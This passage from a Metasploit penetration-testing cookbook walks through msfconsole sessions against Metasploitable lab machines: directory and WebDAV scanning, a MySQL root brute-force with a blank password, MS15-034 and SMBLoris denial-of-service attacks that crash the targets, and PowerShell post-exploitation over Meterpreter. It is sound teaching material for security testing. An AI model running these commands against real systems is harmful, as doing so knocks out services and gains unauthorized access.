
## Getting ready

To list available auxiliary modules, we can use the `show auxiliary` command within `msfconsole`:

![](img/6b6e557533100c0e47951d0e5e14c4ee_664_0.png)

With almost 1,000 auxiliary modules, Metasploit is probably one of the most complete penetration frameworks out there.

## How to do it...

We will start with one of the most useful HTTP auxiliary modules, the HTTP Directory Scanner. This module identifies the existence of interesting directories in a given directory path. By default, it uses the `wmap_dirs.txt` word dictionary but you can specify your own; to run the module we need to set the target IP address, range, or CIDR identifier.

- 1. In this example, I used the IP address of the Metasploitable 2 target machine:

```
msf > use auxiliary/scanner/http/dir_scanner
msf auxiliary(scanner/http/dir_scanner) >
set RHOSTS 192.168.216.129
RHOSTS => 192.168.216.129
msf auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 192.168.216.129
```

```
[+] Found http://192.168.216.129:80/cgi-bin/
404 (192.168.216.129)
[+] Found http://192.168.216.129:80/doc/ 200
(192.168.216.129)
[+] Found http://192.168.216.129:80/icons/ 200
(192.168.216.129)
[+] Found http://192.168.216.129:80/index/ 404
(192.168.216.129)
[+] Found http://192.168.216.129:80/phpMyAdmin/ 200
(192.168.216.129)
[+] Found http://192.168.216.129:80/test/ 404
(192.168.216.129)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/dir_scanner) >
```

Looking at the output, we can see that it was able to find several interesting directories such as phpMyAdmin, test, doc, cgi-bin, among others

- 2. Another useful auxiliary module is the HTTP WebDAV Scanner, which detects webservers with WebDAV enabled. To use it, set the PATH to use and the target IP address, range, or CIDR identifier:

```
msf > use auxiliary/scanner/http/webdav_scanner
msf auxiliary(scanner/http/webdav_scanner) >
set PATH /dav/
PATH => /dav/
msf auxiliary(scanner/http/webdav_scanner) >
set RHOSTS 192.168.216.129
RHOSTS => 192.168.216.129
msf auxiliary(scanner/http/webdav_scanner) > run

[+] 192.168.216.129 (Apache/2.2.8 (Ubuntu) DAV/2)
has WEBDAV ENABLED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/webdav_scanner) >
```

- 3. Let's discuss a specific scanner module involving some extra inputs.

The MySQL Login Utility module is a brute force module that scans for the availability of the MySQL server on the target and tries to log in to the database by attacking it with brute force, using the Metasploitable 3 machine as the target:

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) >
```

```
set USERNAME root
USERNAME => root
msf auxiliary(scanner/mysql/mysql_login) >
set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
msf auxiliary(scanner/mysql/mysql_login) >
set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(scanner/mysql/mysql_login) > run

[+] 192.168.216.10:3306 - 192.168.216.10:3306 -
Found remote MySQL version 5.5.20
[+] 192.168.216.10:3306 - 192.168.216.10:3306 -
Success: 'root:'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mysql/mysql_login) >
```

Looking at the output we can see that we were able to log in to the MySQL server, using the username root and a blank password.

## DoS attack modules

In previous chapters, we learned to use Metasploit in a variety of attack scenarios. In this recipe, we will focus on Denial-of-Service (DoS) attacks. DoS attacks focus on making resources unavailable for the purpose for which they were designed. DoS modules help penetration testers in attack services figure out if clients are susceptible to such attacks. So let’s discuss some of these modules in detail.

## How to do it...

In this recipe, we will focus on two of the most commonly attacked protocols, HTTP and SMB.

## HTTP

We will start by having a look at the MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service auxiliary module. This module checks if hosts are vulnerable to CVE-2015-1635 (MS15-034), a vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code execution.

- 1. To use the module, set the target IP address of the Metasploitable 3 target machine and run it:

```
msf > use auxiliary/dos/http/ms15_034_ulonglongadd
msf auxiliary(dos/http/ms15_034_ulonglongadd) >
set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(dos/http/ms15_034_ulonglongadd) > run

[*] DOS request sent
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(dos/http/ms15_034_ulonglongadd) >
```

Looking at the target machine, we can verify that it is vulnerable to this attack, which crashed the machine leaving us with a Blue Screen of Death:

![](img/6b6e557533100c0e47951d0e5e14c4ee_667_0.png)

## SMB

SMB is another protocol that has been targeted by several vulnerabilities over the years. SMBLoris is a remote and uncredentialed DoS attack against Microsoft Windows operating systems. This attack consumes large chunks of memory in the target by sending SMB requests with the NetBios Session Service (NBSS) Length Header value set to the maximum possible value. Affecting all modern versions of Windows from Windows 2000 through to Windows 10, this attack can make business-critical services unavailable.

- 1. Before launching `msfconsole` and using the SMBLoris NBSS Denial of Service auxiliary module, we must change the limit for open files in our system. For this, we can use the `ulimit` command with the `-n` option for open files and set it to 99999. Then, load the module in `msfconsole`, set the target's IP address, and execute the attack:
- 2. In the target machine, you should see the memory consumption rise quickly until the machine halts:

```
root@kali:~# ulimit -n 99999
root@kali:~# msfconsole -q
msf > use auxiliary/dos/smb/smb_loris
msf auxiliary(dos/smb/smb_loris) >
set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf auxiliary(dos/smb/smb_loris) > run

[*] 192.168.216.11:445 - Sending packet
from Source Port: 1025
[*] 192.168.216.11:445 - Sending packet
from Source Port: 1026
[*] 192.168.216.11:445 - Sending packet
from Source Port: 1027
[*] 192.168.216.11:445 - Sending packet
from Source Port: 1028
[*] 192.168.216.11:445 - Sending packet
from Source Port: 1029
...
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_669_0.png)

DoS modules allow us not only to verify whether systems are vulnerable, but also to test whether patches and mitigation against these types of attacks are working. You would be surprised at the number of systems still vulnerable to these attacks and how often updates break previous patches, leaving systems vulnerable to old attacks.

## Post-exploitation modules

Post-exploitation modules can be run on compromised targets to enumerate targets, escalate privileges, gather credentials, pivot into target networks, and much more. Post modules replaced Meterpreter scripts that are obsolete and no longer supported.

## Getting ready

With more than 300 post modules, Metasploit has become one of the most complete post tools in the world, and thanks to the community, it is growing at a fast pace.

## How to do it...

Let's have a look at some post-exploitation modules and how to use them. In this recipe, we will use the Windows Powershell Execution Post Module to execute PowerShell scripts in a Meterpreter session.

First, we need to get a session on the Metasploitable 3 target machine; for that we can use the Microsoft Windows Authenticated User Code Execution exploit module, then load the Windows Powershell Execution Post Module, set the Meterpreter session, and specify the PowerShell commands we want to execute in this example $Host :

![](img/6b6e557533100c0e47951d0e5e14c4ee_670_0.png)

Successful execution of the module shows us the result of the $Host command. post modules give us access to powerful post-exploitation functionalities and allow us to automate the most repetitive tasks. So, if you are looking to contribute to the Metasploit community, then you can work on post modules.
